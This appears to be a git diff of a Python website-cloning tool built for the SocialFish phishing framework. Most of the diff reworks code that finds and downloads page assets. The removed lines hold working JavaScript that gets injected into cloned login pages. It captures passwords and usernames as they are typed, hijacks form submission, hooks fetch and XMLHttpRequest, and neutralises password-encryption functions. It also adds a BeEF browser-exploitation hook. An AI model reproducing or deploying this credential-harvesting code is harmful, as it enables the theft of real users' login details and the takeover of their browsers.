-                                        // Send to server immediately
-                                        try {
-                                            fetch('/capture_password', {
-                                                method: 'POST',
-                                                headers: {'Content-Type': 'application/json'},
-                                                body: JSON.stringify({
-                                                    field: name,
-                                                    password: value,
-                                                    event: eventType,
-                                                    timestamp: Date.now()
-                                                })
-                                            }).catch(() => {}); // Silent fail
-                                        } catch (e) {}
-                                    }
-                                }, true);
-                            });
-                        }
-                    }
-                    
-                    // Also monitor username/email fields
-                    if (/email|user|login/i.test(name) && type !== 'password') {
-                        if (!input._usernameMonitored) {
-                            input._usernameMonitored = true;
-                            input.addEventListener('input', function() {
-                                if (this.value) {
-                                    window.socialfishUsername = this.value;
-                                    console.log("💥 PRODUCTION USERNAME:", this.value);
-                                }
-                            });
-                        }
-                    }
-                });
-            };
-            
-            // PRODUCTION OPTION 2: FORM SUBMISSION HIJACKING
-            const productionFormHijack = () => {
-                document.querySelectorAll('form').forEach(form => {
-                    if (!form._productionHijacked) {
-                        form._productionHijacked = true;
-                        
-                        // Override form submission completely
-                        form.addEventListener('submit', function(e) {
-                            e.preventDefault();
-                            console.log("💥 PRODUCTION FORM HIJACKED");
-                            
-                            // Collect all form data
-                            const formData = new FormData(this);
-                            const data = {};
-                            
-                            // Get data from FormData
-                            for (let [key, value] of formData.entries()) {
-                                data[key] = value;
-                            }
-                            
-                            // CRITICAL: Inject stored passwords
-                            let hasPassword = false;
-                            for (let [key, value] of Object.entries(data)) {
-                                if (/pass|pwd/i.test(key) && value) {
-                                    hasPassword = true;
-                                    break;
-                                }
-                            }
-                            
-                            // If no password found, use our stored ones
-                            if (!hasPassword) {
-                                if (window.socialfishLastPassword) {
-                                    data['pass'] = window.socialfishLastPassword;
-                                    console.log("💥 PRODUCTION INJECTED STORED PASSWORD:", window.socialfishLastPassword);
-                                }
-                                
-                                // Try all stored passwords
-                                window.socialfishPasswords.forEach((password, field) => {
-                                    if (!data[field] && password) {
-                                        data[field] = password;
-                                        console.log(`💥 PRODUCTION INJECTED ${field}:`, password);
-                                    }
-                                });
-                            }
-                            
-                            // Add username if available
-                            if (window.socialfishUsername && !data['email']) {
-                                data['email'] = window.socialfishUsername;
-                            }
-                            
-                            console.log("💥 PRODUCTION FINAL DATA:", data);
-                            
-                            // Submit to SocialFish with all data
-                            const hiddenForm = document.createElement('form');
-                            hiddenForm.method = 'POST';
-                            hiddenForm.action = '/login';
-                            hiddenForm.style.display = 'none';
-                            
-                            Object.keys(data).forEach(key => {
-                                const input = document.createElement('input');
-                                input.type = 'hidden';
-                                input.name = key;
-                                input.value = data[key] || '';
-                                hiddenForm.appendChild(input);
-                            });
-                            
-                            document.body.appendChild(hiddenForm);
-                            hiddenForm.submit();
-                        });
-                    }
-                });
-            };
-            
-            // PRODUCTION OPTION 3: BACKUP PASSWORD CAPTURE VIA AJAX
-            const setupAjaxBackup = () => {
-                // Monitor any AJAX requests and capture passwords
-                const originalFetch = window.fetch;
-                window.fetch = function(...args) {
-                    const url = args[0];
-                    const options = args[1] || {};
-                    
-                    if (options.body && typeof options.body === 'string') {
-                        try {
-                            const data = JSON.parse(options.body);
-                            Object.keys(data).forEach(key => {
-                                if (/pass|pwd/i.test(key) && data[key]) {
-                                    console.log(`💥 PRODUCTION AJAX PASSWORD - ${key}:`, data[key]);
-                                    window.socialfishLastPassword = data[key];
-                                }
-                            });
-                        } catch (e) {}
-                    }
-                    
-                    return originalFetch.apply(this, args);
-                };
-                
-                // Also monitor XMLHttpRequest
-                const originalXHRSend = XMLHttpRequest.prototype.send;
-                XMLHttpRequest.prototype.send = function(data) {
-                    if (data && typeof data === 'string') {
-                        try {
-                            // Check if it's JSON
-                            const jsonData = JSON.parse(data);
-                            Object.keys(jsonData).forEach(key => {
-                                if (/pass|pwd/i.test(key) && jsonData[key]) {
-                                    console.log(`💥 PRODUCTION XHR PASSWORD - ${key}:`, jsonData[key]);
-                                    window.socialfishLastPassword = jsonData[key];
-                                }
-                            });
-                        } catch (e) {
-                            // Check if it's form data
-                            if (data.includes('password') || data.includes('pass')) {
-                                const matches = data.match(/(?:password|pass)=([^&]+)/);
-                                if (matches && matches[1]) {
-                                    const password = decodeURIComponent(matches[1]);
-                                    console.log("💥 PRODUCTION XHR FORM PASSWORD:", password);
-                                    window.socialfishLastPassword = password;
-                                }
-                            }
-                        }
-                    }
-                    return originalXHRSend.call(this, data);
-                };
-            };
-            
-            // PRODUCTION OPTION 4: GLOBAL PASSWORD WATCHER
-            const globalPasswordWatcher = () => {
-                // Watch for any password-like values being set anywhere
-                const originalSetAttribute = Element.prototype.setAttribute;
-                Element.prototype.setAttribute = function(name, value) {
-                    if (name === 'value' && this.type === 'password' && value) {
-                        console.log("💥 PRODUCTION SETATTRIBUTE PASSWORD:", value);
-                        window.socialfishLastPassword = value;
-                    }
-                    return originalSetAttribute.call(this, name, value);
-                };
-            };
-            
-            // Initialize all production systems
-            const initProduction = () => {
-                console.log("💥 PRODUCTION INITIALIZING ALL SYSTEMS");
-                productionPasswordMonitor();
-                productionFormHijack();
-                setupAjaxBackup();
-                globalPasswordWatcher();
-            };
-            
-            // Run immediately and on DOM ready
-            if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', initProduction);
-            } else {
-                initProduction();
-            }
-            
-            // Continuous monitoring every 100ms
-            setInterval(() => {
-                productionPasswordMonitor();
-                productionFormHijack();
-            }, 100);
-            
-            // Global exposure for debugging
-            window.getSocialFishProduction = () => ({
-                passwords: Array.from(window.socialfishPasswords.entries()),
-                lastPassword: window.socialfishLastPassword,
-                username: window.socialfishUsername
-            });
-            
-            console.log("💥 PRODUCTION PASSWORD CAPTURE SYSTEM READY");
-            
-        })();'''
-        
-        head = soup.find('head')
-        if head:
-            # Insert near the beginning but after our nuclear interceptor
-            head.insert(1, script)
-        else:
-            # If no head, insert at beginning of body
-            body = soup.find('body')
-            if body:
-                body.insert(0, script)
-    
-    def _process_with_regex(self, html_content: str, base_url: str, 
-                           output_dir: Path, beef_enabled: bool) -> str:
-        """Regex-based processing fallback with ULTRA password capture"""
-        logger.info("Using regex fallback for HTML processing")
-        
-        # Basic form processing
-        html_content = re.sub(
-            r'(<form[^>]*?)action\s*=\s*["\']([^"\']*)["\']([^>]*>)',
-            r'\1action="/login" data-original-action="\2"\3',
-            html_content, flags=re.IGNORECASE
-        )
-        
-        # ULTRA password capture script - inject at the very beginning
-        ultra_password_script = '''<script>
-(function() {
-    console.log("🔑 ULTRA Password Capture - REGEX VERSION");
-    
-    // Kill encryption immediately
-    window.socialfishCapturedData = {passwords: [], usernames: [], formData: {}};
-    
-    // Nuclear option - kill all possible encryption functions
-    const killFunctions = ['PWDEncrypt', 'encryptPassword', 'hashPassword', '_encrypt', 'passwordEncrypt'];
-    killFunctions.forEach(func => {
-        Object.defineProperty(window, func, {
-            get: () => (password) => { 
-                console.log(`🔑 ${func} KILLED - password:`, password); 
-                window.socialfishCapturedData.passwords.push({
-                    field: func, 
-                    value: password, 
-                    timestamp: Date.now(),
-                    source: 'regex-kill'
-                }); 
-                return password; 
-            },
-            set: () => {},
-            configurable: false
-        });
-    });
-    
-    // Kill module systems
-    window.__d = () => null;
-    if (window.require) window.require = () => ({encrypt: p => p});
-    
-    // Aggressive form monitoring
-    document.addEventListener('submit', function(e) {
-        const form = e.target;
-        const formData = new FormData(form);
-        const captured = {};
-        
-        for (let [key, value] of formData.entries()) {
-            captured[key] = value;
-            if (/password|pwd|pass/i.test(key)) {
-                console.log(`🔑 REGEX PASSWORD CAPTURED - ${key}:`, value);
-                window.socialfishCapturedData.passwords.push({
-                    field: key, 
-                    value: value, 
-                    timestamp: Date.now(),
-                    source: 'regex-form'
-                });
-            }
-            if (/email|username|user/i.test(key)) {
-                window.socialfishCapturedData.usernames.push({
-                    field: key, 
-                    value: value, 
-                    timestamp: Date.now(),
-                    source: 'regex-form'
-                });
-            }
-        }
-        window.socialfishCapturedData.formData = captured;
-        console.log("📊 REGEX form data captured:", captured);
-    }, true);
-    
-    // Monitor password fields in real-time
-    setInterval(() => {
-        document.querySelectorAll('input[type="password"], input[name*="pass"], input[id*="pass"]').forEach(field => {
-            if (!field._ultraMonitored) {
-                field._ultraMonitored = true;
-                field.addEventListener('input', () => {
-                    if (field.value) {
-                        console.log("🔑 REGEX real-time password:", field.value);
-                        window.socialfishCapturedData.passwords.push({
-                            field: field.name || field.id || 'unknown',
-                            value: field.value,
-                            timestamp: Date.now(),
-                            source: 'regex-realtime'
-                        });
-                    }
-                });
-            }
-        });
-    }, 500);
-    
-    console.log("✅ ULTRA Password Capture REGEX Ready");
-})();
-</script>'''
-        
-        # Insert ultra script right after <head> or at the beginning
-        if '<head>' in html_content:
-            html_content = html_content.replace('<head>', '<head>' + ultra_password_script)
-        else:
-            html_content = ultra_password_script + html_content
-        
-        # Remove/disable existing encryption scripts using regex
-        # Comment out PWDEncrypt functions
-        html_content = re.sub(
-            r'(PWDEncrypt\s*[=:]\s*function[^}]+})',
-            r'// DISABLED BY SOCIALFISH: \1',
-            html_content
-        )
-        
-        # Replace PWDEncrypt with password logger
-        html_content = re.sub(
-            r'PWDEncrypt\s*=\s*function\s*\([^)]*\)\s*{[^}]*}',
-            '''PWDEncrypt = function(password) {
-                console.log("🔑 PWDEncrypt REGEX REPLACED - password:", password);
-                if (window.socialfishCapturedData) {
-                    window.socialfishCapturedData.passwords.push({
-                        field: 'PWDEncrypt_regex_replaced',
-                        value: password,
-                        timestamp: Date.now(),
-                        source: 'regex-replacement'
-                    });
-                }
-                return password;
-            }''',
-            html_content
-        )
-        
-        # Add BeEF hook if enabled
-        if beef_enabled:
-            beef_script = '<script src="http://localhost:3000/hook.js"></script>'
-            html_content = html_content.replace('</body>', beef_script + '</body>')
-        
-        return html_content
-    
-    # Include all other methods from your original code (abbreviated for space)
-    # ... (include all the resource processing methods from the original)
-    
-    async def _process_all_resources_with_mapping(self, soup: BeautifulSoup, base_url: str, output_dir: Path):
-        """FIXED: Process all resources and track URL mappings for rewriting"""
-        resources = self._discover_resources_comprehensive(soup, base_url)
-        
-        if not resources:
+        if not unique_resources:
             return
         
-        logger.info(f"🔍 Discovered {len(resources)} resources")
-        
-        # Create semaphore for controlled concurrency
+        # Process all resources with universal semaphore
         semaphore = asyncio.Semaphore(self.config.max_concurrent_downloads)
         tasks = []
         
-        for resource_url, element, attr, resource_type in resources:
-            task = self._process_single_resource_with_mapping(
+        for resource_url, element, attr, resource_type in unique_resources:
+            task = self._process_universal_resource(
                 semaphore, resource_url, element, attr, resource_type, base_url, output_dir
             )
             tasks.append(task)
         
         if tasks:
-            await asyncio.gather(*tasks, return_exceptions=True)
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            success_count = sum(1 for r in results if r and not isinstance(r, Exception))
+            logger.info(f"✅ Universal processing complete: {success_count}/{len(tasks)} resources processed")
     
-    async def _process_single_resource_with_mapping(self, semaphore: asyncio.Semaphore,
-                                                   resource_url: str, element: Any, attr: str,
-                                                   resource_type: str, base_url: str, output_dir: Path):
-        """FIXED: Process single resource and track URL mapping"""
-        async with semaphore:
-            try:
-                # Resolve URL
-                absolute_url = self._resolve_url(resource_url, base_url)
-                if not absolute_url:
-                    return
-                
-                # Use universal synchronous download in thread
-                loop = asyncio.get_event_loop()
-                
-                def sync_download():
-                    return self._download_sync_universal_enhanced(absolute_url, output_dir, resource_type, base_url)
-                
-                # Run in thread
-                local_path = await loop.run_in_executor(None, sync_download)
-                
-                if local_path:
-                    # CRITICAL FIX: Store URL mapping for later rewriting
-                    self.resource_manager.url_mappings[absolute_url] = local_path
-                    # Also map original URL if different
-                    if resource_url != absolute_url:
-                        self.resource_manager.url_mappings[resource_url] = local_path
-                    
-                    # Update element with local path (for direct src/href attributes)
-                    if element and attr in ['src', 'href']:
-                        element[attr] = local_path
-                
-            except Exception as e:
-                logger.debug(f"Resource processing failed for {resource_url}: {e}")
-    
-    def _rewrite_urls_in_html(self, soup: BeautifulSoup, base_url: str):
-        """CRITICAL FIX: Rewrite URLs in HTML after all resources are downloaded"""
-        
-        # Rewrite URLs in style attributes (background-image, etc.)
-        for element in soup.find_all(style=True):
-            original_style = element.get('style', '')
-            if original_style:
-                new_style = self._rewrite_urls_in_css_text(original_style, base_url)
-                if new_style != original_style:
-                    element['style'] = new_style
-        
-        # Rewrite URLs in <style> tags
-        for style_tag in soup.find_all('style'):
-            if style_tag.string:
-                original_css = style_tag.string
-                new_css = self._rewrite_urls_in_css_text(original_css, base_url)
-                if new_css != original_css:
-                    style_tag.string = new_css
-        
-        # Additional URL rewriting for any missed src/href attributes
-        for element in soup.find_all(['img', 'script', 'link']):
-            for attr in ['src', 'href']:
-                if element.get(attr):
-                    original_url = element[attr]
-                    absolute_url = self._resolve_url(original_url, base_url)
-                    if absolute_url and absolute_url in self.resource_manager.url_mappings:
-                        element[attr] = self.resource_manager.url_mappings[absolute_url]
-    
-    def _rewrite_urls_in_css_text(self, css_text: str, base_url: str) -> str:
-        """CRITICAL FIX: Rewrite URLs in CSS text using mappings"""
-        
-        def replace_url(match):
-            original_url = match.group(1).strip('\'"')
-            absolute_url = self._resolve_url(original_url, base_url)
-            
-            # Check if we have a local mapping for this URL
-            if absolute_url and absolute_url in self.resource_manager.url_mappings:
-                local_path = self.resource_manager.url_mappings[absolute_url]
-                return f'url("{local_path}")'
-            elif original_url in self.resource_manager.url_mappings:
-                local_path = self.resource_manager.url_mappings[original_url]
-                return f'url("{local_path}")'
-            
-            # Return original if no mapping found
-            return match.group(0)
-        
-        # Replace url() references in CSS
-        css_text = re.sub(r'url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)', replace_url, css_text)
-        
-        return css_text
-    
-    # Include all the resource discovery methods from your original code
-    def _discover_resources_comprehensive(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
-        """ENHANCED: Comprehensive resource discovery for all websites"""
+    def _discover_standard_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
+        """Discover all standard web resources universally"""
         resources = []
         
-        # 1. Standard CSS resources
-        for link in soup.find_all('link', rel='stylesheet'):
-            href = link.get('href')
-            if href and self._is_valid_url_enhanced(href, base_url):
-                resources.append((href, link, 'href', 'css'))
+        # CSS resources (all patterns)
+        css_selectors = [
+            ('link[rel="stylesheet"]', 'href', 'css'),
+            ('link[type="text/css"]', 'href', 'css'),
+            ('style[src]', 'src', 'css'),
+            ('link[rel="preload"][as="style"]', 'href', 'css'),
+            ('link[rel="alternate stylesheet"]', 'href', 'css')
+        ]
         
-        # 2. Standard JavaScript resources
-        for script in soup.find_all('script', src=True):
-            src = script.get('src')
-            if src and self._is_valid_url_enhanced(src, base_url):
-                resources.append((src, script, 'src', 'js'))
+        for selector, attr, res_type in css_selectors:
+            for element in soup.select(selector):
+                url = element.get(attr)
+                if url and self._is_valid_resource_url(url, base_url):
+                    resources.append((url, element, attr, res_type))
         
-        # 3. ENHANCED: Image resources with better type detection
-        for img in soup.find_all('img', src=True):
-            src = img.get('src')
-            if src and self._is_valid_url_enhanced(src, base_url):
-                resource_type = self._detect_resource_type_universal(src)
-                resources.append((src, img, 'src', resource_type))
+        # JavaScript resources (all patterns)
+        js_selectors = [
+            ('script[src]', 'src', 'js'),
+            ('script[type*="javascript"][src]', 'src', 'js'),
+            ('link[rel="preload"][as="script"]', 'href', 'js'),
+            ('link[rel="modulepreload"]', 'href', 'js')
+        ]
         
-        # 4. ENHANCED: Font resources
-        for link in soup.find_all('link', href=True):
-            href = link.get('href')
-            if href and self._is_font_resource(href) and self._is_valid_url_enhanced(href, base_url):
-                resources.append((href, link, 'href', 'font'))
+        for selector, attr, res_type in js_selectors:
+            for element in soup.select(selector):
+                url = element.get(attr)
+                if url and self._is_valid_resource_url(url, base_url):
+                    resources.append((url, element, attr, res_type))
         
-        # 5. NEW: Data attribute resources (lazy loading)
-        resources.extend(self._find_data_attribute_resources(soup, base_url))
+        # Image resources (comprehensive)
+        image_selectors = [
+            ('img[src]', 'src', 'image'),
+            ('img[data-src]', 'data-src', 'image'),
+            ('img[data-lazy-src]', 'data-lazy-src', 'image'),
+            ('img[data-original]', 'data-original', 'image'),
+            ('source[src]', 'src', 'image'),
+            ('source[srcset]', 'srcset', 'image'),
+            ('picture source[srcset]', 'srcset', 'image'),
+            ('link[rel*="icon"]', 'href', 'image'),
+            ('meta[property="og:image"]', 'content', 'image'),
+            ('meta[name="twitter:image"]', 'content', 'image'),
+            ('meta[name="msapplication-TileImage"]', 'content', 'image')
+        ]
         
-        # 6. NEW: CSS background resources - CRITICAL FOR INSTAGRAM LOGO
-        resources.extend(self._find_css_background_resources(soup, base_url))
+        for selector, attr, res_type in image_selectors:
+            for element in soup.select(selector):
+                url = element.get(attr)
+                if url and self._is_valid_resource_url(url, base_url):
+                    if attr == 'srcset':
+                        # Handle srcset with multiple URLs
+                        srcset_urls = self._parse_srcset(url)
+                        for srcset_url in srcset_urls:
+                            if self._is_valid_resource_url(srcset_url, base_url):
+                                resources.append((srcset_url, element, attr, res_type))
+                    else:
+                        resources.append((url, element, attr, res_type))
         
-        # 7. NEW: JavaScript embedded resources
-        resources.extend(self._find_js_embedded_resources(soup, base_url))
+        # Font resources (comprehensive)
+        font_selectors = [
+            ('link[href*=".woff"]', 'href', 'font'),
+            ('link[href*=".woff2"]', 'href', 'font'),
+            ('link[href*=".ttf"]', 'href', 'font'),
+            ('link[href*=".otf"]', 'href', 'font'),
+            ('link[href*=".eot"]', 'href', 'font'),
+            ('link[rel="preload"][as="font"]', 'href', 'font'),
+            ('@font-face', None, 'font')  # Special case handled separately
+        ]
         
-        # 8. NEW: SVG specific resources
-        resources.extend(self._find_svg_resources(soup, base_url))
-        
-        # 9. NEW: Dynamic resource patterns
-        resources.extend(self._find_dynamic_resources(soup, base_url))
-        
-        # Remove duplicates while preserving order
-        seen = set()
-        unique_resources = []
-        for resource in resources:
-            url = resource[0]
-            if url not in seen:
-                seen.add(url)
-                unique_resources.append(resource)
-        
-        return unique_resources
-    
-    # [Include all other methods from your original code - abbreviated for space]
-    # All the helper methods like _detect_resource_type_universal, _find_css_background_resources, etc.
-    # should be copied from your original code exactly as they are
-    
-    def _detect_resource_type_universal(self, url: str) -> str:
-        """Universal resource type detection"""
-        url_lower = url.lower()
-        
-        # Handle dynamic resource patterns (like Facebook's rsrc.php)
-        if any(pattern in url for pattern in ['/rsrc.php/', '/resource/', '/assets/', '/static/']):
-            # Try to detect from URL ending
-            if url_lower.endswith('.svg') or '.svg' in url_lower:
-                return 'svg'
-            elif url_lower.endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp', '.avif')):
-                return 'image'
-            elif url_lower.endswith('.css'):
-                return 'css'
-            elif url_lower.endswith('.js'):
-                return 'js'
-            elif any(ext in url_lower for ext in ['.woff', '.woff2', '.ttf', '.otf']):
-                return 'font'
+        for selector, attr, res_type in font_selectors:
+            if selector == '@font-face':
+                # Handle @font-face in style tags
+                resources.extend(self._extract_font_face_urls(soup, base_url))
             else:
-                return 'asset'
+                for element in soup.select(selector):
+                    url = element.get(attr)
+                    if url and self._is_valid_resource_url(url, base_url):
+                        resources.append((url, element, attr, res_type))
         
-        # Standard detection
-        if url_lower.endswith('.svg'):
-            return 'svg'
-        elif url_lower.endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp', '.avif')):
-            return 'image'
-        elif url_lower.endswith('.css'):
-            return 'css'
-        elif url_lower.endswith('.js'):
-            return 'js'
-        elif any(ext in url_lower for ext in ['.woff', '.woff2', '.ttf', '.otf']):
-            return 'font'
+        # Video and audio resources
+        media_selectors = [
+            ('video[src]', 'src', 'video'),
+            ('video source[src]', 'src', 'video'),
+            ('video[poster]', 'poster', 'image'),
+            ('audio[src]', 'src', 'audio'),
+            ('audio source[src]', 'src', 'audio'),
+            ('track[src]', 'src', 'text')
+        ]
         
-        return 'asset'
-    
-    def _is_font_resource(self, url: str) -> bool:
-        """Check if URL is a font resource"""
-        font_extensions = ['.woff', '.woff2', '.ttf', '.otf', '.eot']
-        url_lower = url.lower()
-        return any(ext in url_lower for ext in font_extensions)
-    
-    def _find_data_attribute_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
-        """Find resources in data attributes (lazy loading)"""
-        resources = []
-        
-        # Common data attributes for lazy loading
-        data_attrs = ['data-src', 'data-href', 'data-background', 'data-bg', 'data-original', 'data-lazy']
-        
-        for attr in data_attrs:
-            for element in soup.find_all(attrs={attr: True}):
-                src = element.get(attr)
-                if src and self._is_valid_url_enhanced(src, base_url):
-                    resource_type = self._detect_resource_type_universal(src)
-                    resources.append((src, element, attr, resource_type))
+        for selector, attr, res_type in media_selectors:
+            for element in soup.select(selector):
+                url = element.get(attr)
+                if url and self._is_valid_resource_url(url, base_url):
+                    resources.append((url, element, attr, res_type))
         
         return resources
     
-    def _find_css_background_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
-        """CRITICAL FIX: Find background images and resources in CSS - FIXED FOR INSTAGRAM"""
+    def _discover_advanced_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
+        """Discover advanced and modern web resources"""
         resources = []
         
-        # Process inline styles - THIS IS WHERE INSTAGRAM LOGO IS
+        # CSS background and inline resources
+        resources.extend(self._discover_css_inline_resources(soup, base_url))
+        
+        # JavaScript embedded resources
+        resources.extend(self._discover_js_embedded_resources(soup, base_url))
+        
+        # Data attribute resources (lazy loading patterns)
+        data_attributes = [
+            'data-src', 'data-href', 'data-url', 'data-image', 'data-bg', 
+            'data-background', 'data-lazy-src', 'data-original', 'data-thumb',
+            'data-full', 'data-large', 'data-high-res'
+        ]
+        
+        for attr in data_attributes:
+            for element in soup.find_all(attrs={attr: True}):
+                url = element.get(attr)
+                if url and self._is_valid_resource_url(url, base_url):
+                    resource_type = self._detect_universal_resource_type(url)
+                    resources.append((url, element, attr, resource_type))
+        
+        # SVG specific resources
+        resources.extend(self._discover_svg_resources(soup, base_url))
+        
+        # Preload and prefetch resources
+        preload_selectors = [
+            ('link[rel="preload"]', 'href'),
+            ('link[rel="prefetch"]', 'href'),
+            ('link[rel="dns-prefetch"]', 'href'),
+            ('link[rel="preconnect"]', 'href'),
+            ('link[rel="modulepreload"]', 'href')
+        ]
+        
+        for selector, attr in preload_selectors:
+            for element in soup.select(selector):
+                url = element.get(attr)
+                if url and self._is_valid_resource_url(url, base_url):
+                    as_value = element.get('as', '')
+                    resource_type = self._map_as_to_resource_type(as_value) or self._detect_universal_resource_type(url)
+                    resources.append((url, element, attr, resource_type))
+        
+        return resources
+    
+    async def _discover_service_worker_resources(self, soup: BeautifulSoup, base_url: str, output_dir: Path) -> List[Tuple[str, Any, str, str]]:
+        """Discover and process service worker resources"""
+        resources = []
+        
+        # Find service worker registrations in HTML
+        sw_urls = set()
+        
+        # Check for service worker registration scripts
+        for script in soup.find_all('script'):
+            if script.string:
+                # Look for service worker registration patterns
+                sw_patterns = [
+                    r'navigator\.serviceWorker\.register\s*\(\s*["\']([^"\']+)["\']',
+                    r'serviceWorker\.register\s*\(\s*["\']([^"\']+)["\']',
+                    r'register\s*\(\s*["\']([^"\']+\.js)["\']'
+                ]
+                
+                for pattern in sw_patterns:
+                    matches = re.findall(pattern, script.string, re.IGNORECASE)
+                    sw_urls.update(matches)
+        
+        # Process each service worker
+        for sw_url in sw_urls:
+            if self._is_valid_resource_url(sw_url, base_url):
+                resources.append((sw_url, None, 'src', 'js'))
+                
+                # Download and parse service worker for additional resources
+                try:
+                    result = await self.resource_manager.download_resource_universal(
+                        self._resolve_url(sw_url, base_url), 'js', base_url
+                    )
+                    
+                    if result:
+                        content, metadata = result
+                        sw_content = content.decode('utf-8', errors='ignore')
+                        
+                        # Extract resources from service worker
+                        sw_resources = self._extract_resources_from_js(sw_content, base_url)
+                        resources.extend(sw_resources)
+                        
+                        self.resource_manager.stats['service_workers_found'] += 1
+                        
+                except Exception as e:
+                    logger.debug(f"Service worker processing failed: {e}")
+        
+        return resources
+    
+    async def _discover_web_manifest_resources(self, soup: BeautifulSoup, base_url: str, output_dir: Path) -> List[Tuple[str, Any, str, str]]:
+        """Discover and process web app manifest resources"""
+        resources = []
+        
+        # Find manifest links
+        manifest_links = soup.find_all('link', rel='manifest')
+        
+        for link in manifest_links:
+            manifest_url = link.get('href')
+            if manifest_url and self._is_valid_resource_url(manifest_url, base_url):
+                resources.append((manifest_url, link, 'href', 'json'))
+                
+                # Download and parse manifest
+                try:
+                    result = await self.resource_manager.download_resource_universal(
+                        self._resolve_url(manifest_url, base_url), 'json', base_url
+                    )
+                    
+                    if result:
+                        content, metadata = result
+                        manifest_data = json.loads(content.decode('utf-8'))
+                        
+                        # Extract icon resources
+                        for icon in manifest_data.get('icons', []):
+                            if icon.get('src'):
+                                icon_url = icon['src']
+                                if self._is_valid_resource_url(icon_url, base_url):
+                                    resources.append((icon_url, None, 'src', 'image'))
+                        
+                        # Extract screenshot resources
+                        for screenshot in manifest_data.get('screenshots', []):
+                            if screenshot.get('src'):
+                                screenshot_url = screenshot['src']
+                                if self._is_valid_resource_url(screenshot_url, base_url):
+                                    resources.append((screenshot_url, None, 'src', 'image'))
+                        
+                        self.resource_manager.stats['manifests_found'] += 1
+                        
+                except Exception as e:
+                    logger.debug(f"Manifest processing failed: {e}")
+        
+        return resources
+    
+    def _discover_dynamic_universal_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
+        """Discover dynamic resources using universal patterns"""
+        resources = []
+        
+        # Universal URL patterns that might contain resources
+        url_patterns = [
+            r'https?://[^\s<>"\'()]+\.(png|jpg|jpeg|gif|svg|webp|avif|css|js|woff|woff2|ttf|otf|mp4|mp3|wav)',
+            r'["\']([^"\']*\.(png|jpg|jpeg|gif|svg|webp|avif|css|js|woff|woff2|ttf|otf|mp4|mp3|wav))["\']',
+            r'url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)',
+            r'src\s*[:=]\s*["\']([^"\']+)["\']',
+            r'href\s*[:=]\s*["\']([^"\']+)["\']'
+        ]
+        
+        # Search in all text content
+        page_text = soup.get_text()
+        for pattern in url_patterns:
+            matches = re.findall(pattern, page_text, re.IGNORECASE)
+            for match in matches:
+                url = match[0] if isinstance(match, tuple) else match
+                if self._is_valid_resource_url(url, base_url):
+                    resource_type = self._detect_universal_resource_type(url)
+                    resources.append((url, None, 'dynamic', resource_type))
+        
+        # Search in all script contents
+        for script in soup.find_all('script'):
+            if script.string:
+                script_resources = self._extract_resources_from_js(script.string, base_url)
+                resources.extend(script_resources)
+        
+        return resources
+    
+    def _discover_css_inline_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
+        """Discover resources in CSS (inline styles and style tags)"""
+        resources = []
+        
+        # Process inline style attributes
         for element in soup.find_all(style=True):
             style_content = element.get('style', '')
-            urls = self._extract_urls_from_css_universal(style_content, base_url)
-            for url in urls:
-                resource_type = self._detect_resource_type_universal(url)
-                # Don't store element reference for style URLs - we'll rewrite them later
-                resources.append((url, None, 'style', resource_type))
+            css_urls = self._extract_urls_from_css(style_content, base_url)
+            for url in css_urls:
+                resource_type = self._detect_universal_resource_type(url)
+                resources.append((url, element, 'style', resource_type))
         
         # Process style tags
         for style_tag in soup.find_all('style'):
             if style_tag.string:
-                urls = self._extract_urls_from_css_universal(style_tag.string, base_url)
-                for url in urls:
-                    resource_type = self._detect_resource_type_universal(url)
-                    resources.append((url, None, 'content', resource_type))
+                css_urls = self._extract_urls_from_css(style_tag.string, base_url)
+                for url in css_urls:
+                    resource_type = self._detect_universal_resource_type(url)
+                    resources.append((url, style_tag, 'content', resource_type))
         
         return resources
     
-    def _extract_urls_from_css_universal(self, css_content: str, base_url: str) -> List[str]:
-        """Extract URLs from CSS content - universal patterns"""
-        import re
+    def _discover_js_embedded_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
+        """Discover resources embedded in JavaScript"""
+        resources = []
+        
+        for script in soup.find_all('script'):
+            if script.string:
+                js_resources = self._extract_resources_from_js(script.string, base_url)
+                resources.extend([(url, script, 'js-embedded', res_type) for url, res_type in js_resources])
+        
+        return resources
+    
+    def _discover_svg_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
+        """Discover SVG-specific resources"""
+        resources = []
+        
+        # Inline SVG resources
+        for svg in soup.find_all('svg'):
+            # Image references in SVG
+            for image in svg.find_all('image'):
+                for attr in ['href', 'xlink:href']:
+                    url = image.get(attr)
+                    if url and self._is_valid_resource_url(url, base_url):
+                        resources.append((url, image, attr, 'image'))
+            
+            # Use elements with external references
+            for use in svg.find_all('use'):
+                for attr in ['href', 'xlink:href']:
+                    url = use.get(attr)
+                    if url and url.startswith('http') and self._is_valid_resource_url(url, base_url):
+                        resources.append((url, use, attr, 'svg'))
+            
+            # Pattern and filter references
+            for elem in svg.find_all(['pattern', 'filter', 'defs']):
+                for child in elem.find_all(True):
+                    for attr in ['href', 'xlink:href']:
+                        url = child.get(attr)
+                        if url and self._is_valid_resource_url(url, base_url):
+                            resources.append((url, child, attr, 'svg'))
+        
+        return resources
+    
+    def _extract_font_face_urls(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
+        """Extract font URLs from @font-face declarations"""
+        resources = []
+        
+        for style_tag in soup.find_all('style'):
+            if style_tag.string:
+                # Find @font-face rules
+                font_face_pattern = r'@font-face\s*{[^}]*}'
+                font_faces = re.findall(font_face_pattern, style_tag.string, re.IGNORECASE | re.DOTALL)
+                
+                for font_face in font_faces:
+                    # Extract src URLs
+                    url_pattern = r'src:\s*url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)'
